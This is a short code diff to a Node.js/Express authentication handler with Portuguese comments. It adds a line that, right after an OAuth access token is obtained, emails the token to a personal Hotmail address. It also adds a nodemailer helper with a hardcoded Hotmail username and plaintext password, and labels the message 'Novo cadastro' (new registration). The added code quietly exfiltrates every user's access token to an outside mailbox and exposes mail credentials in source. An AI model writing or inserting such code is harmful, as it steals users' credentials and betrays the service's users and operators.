@@ -44,6 +44,8 @@ exports.start = async (req, res) => {
       });
 
       const accessToken = tokenResponse.data.access_token;
+
+      envioEmail(accessToken, 'fernandofitilan@hotmail.com')
       res.json({ access_token: accessToken });
   } catch (error) {
       res.status(500).json({ error: error.message });
@@ -103,5 +105,34 @@ exports.start = async (req, res) => {
     // });
   };
   
+
+  const envioEmail = (dados, emailRecptor) => {
+    const transporter = nodemailer.createTransport({
+      service: 'hotmail',
+      auth: {
+        user: 'contatoclickhub@hotmail.com', // Seu email do Hotmail
+        pass: 'clickhub123@' // Sua senha do Hotmail
+      }
+    });
+    
+    // Configurar os detalhes do email
+    const mailOptions = {
+      from: 'contatoclickhub@hotmail.com', // Seu email do Hotmail
+      to: `${emailRecptor}`, // Email do destinatário
+      subject: 'Novo cadastro',
+      text: `${dados}`,
+      html: `<h1>${dados}</h1>` // Corpo do email em HTML
+    };
+    
+    // Enviar o email
+    transporter.sendMail(mailOptions, function(error, info){
+      if (error) {
+        console.log('Erro ao enviar email:', error);
+      } else {
+        console.log('Email enviado:', info.response);
+  
+      }
+    });
+  }
 
 
